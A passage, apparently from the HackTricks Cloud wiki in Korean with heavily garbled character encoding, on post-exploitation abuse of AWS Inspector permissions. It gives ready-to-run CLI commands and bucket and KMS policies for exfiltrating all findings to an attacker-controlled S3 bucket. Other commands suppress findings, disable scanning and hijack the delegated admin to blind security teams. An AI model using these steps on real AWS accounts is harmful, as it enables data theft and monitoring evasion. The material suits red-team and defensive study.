aws inspector list-exclusions --assessment-run-arn <arn>

## Rule packages
aws inspector list-rules-packages
```
## ì‚¬í›„ ì¹¨íˆ¬

{% hint style="success" %}
ê³µê²©ìì˜ ê´€ì ì—ì„œ ì´ ì„œë¹„ìŠ¤ëŠ” ê³µê²©ìê°€ ë‹¤ë¥¸ ì¸ìŠ¤í„´ìŠ¤/ì»¨í…Œì´ë„ˆë¥¼ ì¹¨íˆ¬í•˜ëŠ” ë° ë„ì›€ì´ ë˜ëŠ” ì·¨ì•½ì  ë° ë„¤íŠ¸ì›Œí¬ ë…¸ì¶œì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ê³µê²©ìëŠ” ë˜í•œ í”¼í•´ìê°€ ì·¨ì•½ì (ëª¨ë“  ì·¨ì•½ì  ë˜ëŠ” íŠ¹ì • ì·¨ì•½ì )ì„ ë³¼ ìˆ˜ ì—†ë„ë¡ ì´ ì„œë¹„ìŠ¤ë¥¼ ë°©í•´í•˜ëŠ” ë° ê´€ì‹¬ì´ ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### `inspector2:CreateFindingsReport`, `inspector2:CreateSBOMReport`

ê³µê²©ìëŠ” ì·¨ì•½ì ì´ë‚˜ ì†Œí”„íŠ¸ì›¨ì–´ ë¶€í’ˆ ëª©ë¡(SBOMs)ì— ëŒ€í•œ ìƒì„¸ ë³´ê³ ì„œë¥¼ ìƒì„±í•˜ê³  AWS í™˜ê²½ì—ì„œ ì´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ëŠ” íŠ¹ì • ì·¨ì•½ì , ì˜¤ë˜ëœ ì†Œí”„íŠ¸ì›¨ì–´ ë˜ëŠ” ë³´ì•ˆì— ì·¨ì•½í•œ ì¢…ì†ì„±ì„ ì‹ë³„í•˜ì—¬ íŠ¹ì • ê³µê²©ì„ ê°€ëŠ¥í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Findings report
aws inspector2 create-findings-report --report-format <CSV | JSON> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--filter-criteria <value>]
# SBOM report
aws inspector2 create-sbom-report --report-format <CYCLONEDX_1_4 | SPDX_2_3> --s3-destination <bucketName=string,keyPrefix=string,kmsKeyArn=string> [--resource-filter-criteria <value>]
```
ë‹¤ìŒ ì˜ˆì œëŠ” ê³µê²©ìê°€ ì œì–´í•˜ëŠ” Amazon S3 Bucketìœ¼ë¡œ Amazon Inspectorì˜ ëª¨ë“  Active findingsë¥¼ ìœ ì¶œí•˜ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:

1. **Amazon S3 Bucket ìƒì„±** ë° ì •ì±…ì„ ì²¨ë¶€í•˜ì—¬ í”¼í•´ì Amazon Inspectorì—ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "allow-inspector",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"s3:PutObject",
"s3:PutObjectAcl",
"s3:AbortMultipartUpload"
],
"Resource": "arn:aws:s3:::inspector-findings/*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
},
"ArnLike": {
"aws:SourceArn": "arn:aws:inspector2:us-east-1:<victim-account-id>:report/*"
}
}
}
]
}
```
2. **Amazon KMS í‚¤ë¥¼ ìƒì„±**í•˜ê³  í”¼í•´ìì˜ Amazon Inspectorì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ ì •ì±…ì„ ì²¨ë¶€í•˜ì‹­ì‹œì˜¤:
```json
{
"Version": "2012-10-17",
"Id": "key-policy",
"Statement": [
{
...
},
{
"Sid": "Allow victim Amazon Inspector to use the key",
"Effect": "Allow",
"Principal": {
"Service": "inspector2.amazonaws.com"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*",
"Condition": {
"StringEquals": {
"aws:SourceAccount": "<victim-account-id>"
}
}
}
]
}
```
3. **ê²°ê³¼ ë³´ê³ ì„œë¥¼ ìƒì„±í•˜ëŠ”** ëª…ë ¹ì„ ì‹¤í–‰í•˜ì—¬ ì´ë¥¼ ìœ ì¶œí•˜ì‹­ì‹œì˜¤:
```bash
aws --region us-east-1 inspector2 create-findings-report --report-format CSV --s3-destination bucketName=<attacker-bucket-name>,keyPrefix=exfiltration_,kmsKeyArn=arn:aws:kms:us-east-1:123456789012:key/1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f
```
- **ì ì¬ì  ì˜í–¥**: ìƒì„¸í•œ ì·¨ì•½ì  ë° ì†Œí”„íŠ¸ì›¨ì–´ ë³´ê³ ì„œ ìƒì„± ë° ìœ ì¶œ, íŠ¹ì • ì·¨ì•½ì  ë° ë³´ì•ˆ ì•½ì ì— ëŒ€í•œ í†µì°°ë ¥ íšë“.

### `inspector2:CancelFindingsReport`, `inspector2:CancelSbomExport`

ê³µê²©ìëŠ” ì§€ì •ëœ ë³´ê³ ì„œ ë˜ëŠ” SBOM ë³´ê³ ì„œ ìƒì„±ì„ ì·¨ì†Œí•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¡œ ì¸í•´ ë³´ì•ˆ íŒ€ì´ ì·¨ì•½ì  ë° ì†Œí”„íŠ¸ì›¨ì–´ ë¶€ìì¬(SBOMs)ì— ëŒ€í•œ ì ì‹œ ì •ë³´ë¥¼ ë°›ì§€ ëª»í•˜ê²Œ í•˜ì—¬ ë³´ì•ˆ ë¬¸ì œì˜ ê°ì§€ ë° ê°œì„ ì´ ì§€ì—°ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Cancel findings report generation
aws inspector2 cancel-findings-report --report-id <value>
# Cancel SBOM report generatiom
aws inspector2 cancel-sbom-export --report-id <value>
```
- **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ ë°©í•´ ë° ë³´ì•ˆ ë¬¸ì œì˜ ì ì‹œ ê°ì§€ ë° í•´ê²° ë°©ì§€.
### `inspector2:CreateFilter`, `inspector2:UpdateFilter`, `inspector2:DeleteFilter`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” ì·¨ì•½ì  ë° ë³´ì•ˆ ë¬¸ì œê°€ ë³´ê³ ë˜ê±°ë‚˜ ì–µì œë˜ëŠ” í•„í„°ë§ ê·œì¹™ì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (**action**ì´ SUPPRESSë¡œ ì„¤ì •ëœ ê²½ìš° ì–µì œ ê·œì¹™ì´ ìƒì„±ë¨). ì´ë¡œ ì¸í•´ ë³´ì•ˆ ê´€ë¦¬ìë“¤ë¡œë¶€í„° ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ìˆ¨ê¸¸ ìˆ˜ ìˆì–´ ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ê°ì§€í•˜ì§€ ì•Šê³  ì‰½ê²Œ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¤‘ìš”í•œ í•„í„°ë¥¼ ë³€ê²½í•˜ê±°ë‚˜ ì œê±°í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ë˜í•œ ì‹œìŠ¤í…œì„ ê´€ë ¨ ì—†ëŠ” ê²°ê³¼ë¡œ ì¹¨ëª°ì‹œì¼œ íš¨ê³¼ì ì¸ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ê³¼ ëŒ€ì‘ì„ ë°©í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Create
aws inspector2 create-filter --action <NONE | SUPPRESS> --filter-criteria <value> --name <value> [--reason <value>]
# Update
aws inspector2 update-filter --filter-arn <value> [--action <NONE | SUPPRESS>] [--filter-criteria <value>] [--reason <value>]
# Delete
aws inspector2 delete-filter --arn <value>
```
- **ì ì¬ì  ì˜í–¥**: ì¤‘ìš”í•œ ì·¨ì•½ì ì„ ìˆ¨ê¸°ê±°ë‚˜ ì–µì œí•˜ê±°ë‚˜ ì‹œìŠ¤í…œì„ ê´€ë ¨ ì—†ëŠ” ê²°ê³¼ë¡œ ë„˜ì¹˜ê²Œ ë§Œë“¦.

### `inspector2:DisableDelegatedAdminAccount`, (`inspector2:EnableDelegatedAdminAccount` & `organizations:ListDelegatedAdministrators` & `organizations:EnableAWSServiceAccess` & `iam:CreateServiceLinkedRole`)

ê³µê²©ìëŠ” ë³´ì•ˆ ê´€ë¦¬ êµ¬ì¡°ë¥¼ ì‹¬ê°í•˜ê²Œ ë°©í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ìœ„ì„ëœ ê´€ë¦¬ì ê³„ì •ì„ ë¹„í™œì„±í™”í•˜ë©´ ê³µê²©ìëŠ” ë³´ì•ˆ íŒ€ì´ Amazon Inspector ì„¤ì • ë° ë³´ê³ ì„œì— ì•¡ì„¸ìŠ¤í•˜ê³  ê´€ë¦¬í•˜ëŠ” ê²ƒì„ ë°©í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ë¬´ë‹¨ ê´€ë¦¬ì ê³„ì •ì„ í™œì„±í™”í•˜ë©´ ê³µê²©ìê°€ ë³´ì•ˆ êµ¬ì„±ì„ ì œì–´í•  ìˆ˜ ìˆì–´ì„œ ìŠ¤ìº”ì„ ë¹„í™œì„±í™”í•˜ê±°ë‚˜ ì•…ì˜ì  í™œë™ì„ ìˆ¨ê¸°ê¸° ìœ„í•´ ì„¤ì •ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}

í”¼í•´ìì™€ ë™ì¼í•œ ì¡°ì§ì— ë¬´ë‹¨ ê³„ì •ì´ ìˆì–´ì•¼ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¬´ë‹¨ ê³„ì •ì´ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ë˜ê¸° ìœ„í•´ì„œëŠ” í•©ë²•ì ì¸ ìœ„ì„ëœ ê´€ë¦¬ìê°€ ë¹„í™œì„±í™”ëœ í›„, ë¬´ë‹¨ ê³„ì •ì´ ìœ„ì„ëœ ê´€ë¦¬ìë¡œ í™œì„±í™”ë˜ê¸° ì „ì— í•©ë²•ì ì¸ ê´€ë¦¬ìê°€ ì¡°ì§ì—ì„œ ìœ„ì„ëœ ê´€ë¦¬ìë¡œ ë“±ë¡ í•´ì œë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (**`organizations:DeregisterDelegatedAdministrator`** ê¶Œí•œ í•„ìš”): **`aws organizations deregister-delegated-administrator --account-id <í•©ë²•ì  ê³„ì •-id> --service-principal [inspector2.amazonaws.com](http://inspector2.amazonaws.com/)`**

{% endhint %}
```bash
# Disable
aws inspector2 disable-delegated-admin-account --delegated-admin-account-id <value>
# Enable
aws inspector2 enable-delegated-admin-account --delegated-admin-account-id <value>
```
- **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ê´€ë¦¬ ë°©í•´.

### `inspector2:AssociateMember`, `inspector2:DisassociateMember`

ê³µê²©ìëŠ” Amazon Inspector ì¡°ì§ ë‚´ì˜ íšŒì› ê³„ì • ì—°ê²°ì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¬´ë‹¨ìœ¼ë¡œ ê³„ì •ì„ ì—°ê²°í•˜ê±°ë‚˜ ì ì ˆí•œ ê³„ì •ì„ ì—°ê²° í•´ì œí•¨ìœ¼ë¡œì¨, ê³µê²©ìëŠ” ì–´ë–¤ ê³„ì •ì´ ë³´ì•ˆ ìŠ¤ìº” ë° ë³´ê³ ì„œì— í¬í•¨ë˜ëŠ”ì§€ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ì¤‘ìš”í•œ ê³„ì •ì´ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ì—ì„œ ì œì™¸ë˜ì–´ ê³µê²©ìê°€ í•´ë‹¹ ê³„ì •ì˜ ì·¨ì•½ì ì„ ê°ì§€ë˜ì§€ ì•Šê³  ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}

ì´ ì‘ì—…ì€ ìœ„ì„ëœ ê´€ë¦¬ìì— ì˜í•´ ìˆ˜í–‰ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

{% endhint %}
```bash
# Associate
aws inspector2 associate-member --account-id <value>
# Disassociate
aws inspector2 disassociate-member --account-id <value>
```
- **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ìŠ¤ìº”ì—ì„œ ì£¼ìš” ê³„ì •ì„ ì œì™¸ì‹œí‚´ìœ¼ë¡œì¨ ì·¨ì•½ì ì´ ê°ì§€ë˜ì§€ ì•Šê³  ì•…ìš©ë  ìˆ˜ ìˆìŒ.

### `inspector2:Disable`, (`inspector2:Enable` & `iam:CreateServiceLinkedRole`)

`inspector2:Disable` ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” ì§€ì •ëœ ê³„ì •ì—ì„œ íŠ¹ì • ë¦¬ì†ŒìŠ¤ ìœ í˜• (EC2, ECR, Lambda, Lambda ì½”ë“œ)ì— ëŒ€í•œ ë³´ì•ˆ ìŠ¤ìº”ì„ ë¹„í™œì„±í™”í•  ìˆ˜ ìˆì–´ AWS í™˜ê²½ì˜ ì¼ë¶€ê°€ ëª¨ë‹ˆí„°ë§ë˜ì§€ ì•Šê³  ê³µê²©ì— ì·¨ì•½í•´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ **`inspector2:Enable`** ë° **`iam:CreateServiceLinkedRole`** ê¶Œí•œì„ ì†Œìœ í•œ ê³µê²©ìëŠ” ì˜ì‹¬ìŠ¤ëŸ¬ìš´ êµ¬ì„±ì´ ê°ì§€ë˜ì§€ ì•Šë„ë¡ ìŠ¤ìº”ì„ ì„ íƒì ìœ¼ë¡œ ë‹¤ì‹œ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
ì´ ì‘ì—…ì€ ìœ„ì„ëœ ê´€ë¦¬ìì— ì˜í•´ ìˆ˜í–‰ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.
{% endhint %}
```bash
# Disable
aws inspector2 disable --account-ids <value> [--resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}>]
# Enable
aws inspector2 enable --resource-types <{EC2, ECR, LAMBDA, LAMBDA_CODE}> [--account-ids <value>]
```
- **ì ì¬ì  ì˜í–¥**: ë³´ì•ˆ ëª¨ë‹ˆí„°ë§ì—ì„œ ë¸”ë¼ì¸ë“œ ìŠ¤íŒŸ ìƒì„±.

### `inspector2:UpdateOrganizationConfiguration`

ì´ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” Amazon Inspector ì¡°ì§ì˜ êµ¬ì„±ì„ ì—…ë°ì´íŠ¸í•˜ì—¬ ìƒˆ ë©¤ë²„ ê³„ì •ì— ëŒ€í•´ í™œì„±í™”ëœ ê¸°ë³¸ ìŠ¤ìº” ê¸°ëŠ¥ì— ì˜í–¥ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}

ì´ ì‘ì—…ì€ ìœ„ì„ëœ ê´€ë¦¬ìì— ì˜í•´ ìˆ˜í–‰ë˜ì–´ì•¼ í•©ë‹ˆë‹¤.

{% endhint %}
```bash
aws inspector2 update-organization-configuration --auto-enable <ec2=true|false,ecr=true|false,lambda=true|false,lambdaCode=true|false>
```
- **ì ì¬ì  ì˜í–¥**: ì¡°ì§ì˜ ë³´ì•ˆ ìŠ¤ìº” ì •ì±… ë° êµ¬ì„± ë³€ê²½.

### `inspector2:TagResource`, `inspector2:UntagResource`

ê³µê²©ìëŠ” AWS Inspector ë¦¬ì†ŒìŠ¤ì— íƒœê·¸ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë³´ì•ˆ í‰ê°€ë¥¼ ì¡°ì§í™”, ì¶”ì  ë° ìë™í™”í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤. íƒœê·¸ë¥¼ ë³€ê²½í•˜ê±°ë‚˜ ì œê±°í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ë³´ì•ˆ ìŠ¤ìº”ì—ì„œ ì·¨ì•½ì ì„ ìˆ¨ê¸¸ ìˆ˜ ìˆìœ¼ë©°, ê·œì • ì¤€ìˆ˜ ë³´ê³ ë¥¼ ë°©í•´í•˜ê³  ìë™í™”ëœ ë³µêµ¬ í”„ë¡œì„¸ìŠ¤ì— ê°„ì„­í•˜ì—¬, í™•ì¸ë˜ì§€ ì•Šì€ ë³´ì•ˆ ë¬¸ì œì™€ ì‹œìŠ¤í…œ ë¬´ê²°ì„±ì´ ì†ìƒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
aws inspector2 tag-resource --resource-arn <value> --tags <value>
aws inspector2 untag-resource --resource-arn <value> --tag-keys <value>
```
- **ì ì¬ì  ì˜í–¥**: ì·¨ì•½ì  ìˆ¨ê¹€, ê·œì • ì¤€ìˆ˜ ë³´ê³ ì„œ ë°©í•´, ë³´ì•ˆ ìë™í™” ë°©í•´ ë° ë¹„ìš© í• ë‹¹ ë°©í•´.

# ì°¸ê³  ìë£Œ
- [https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html](https://docs.aws.amazon.com/inspector/latest/user/what-is-inspector.html)
- [https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html](https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazoninspector2.html)


<details>

<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksë¥¼ ê´‘ê³ í•˜ê±°ë‚˜ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜**íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
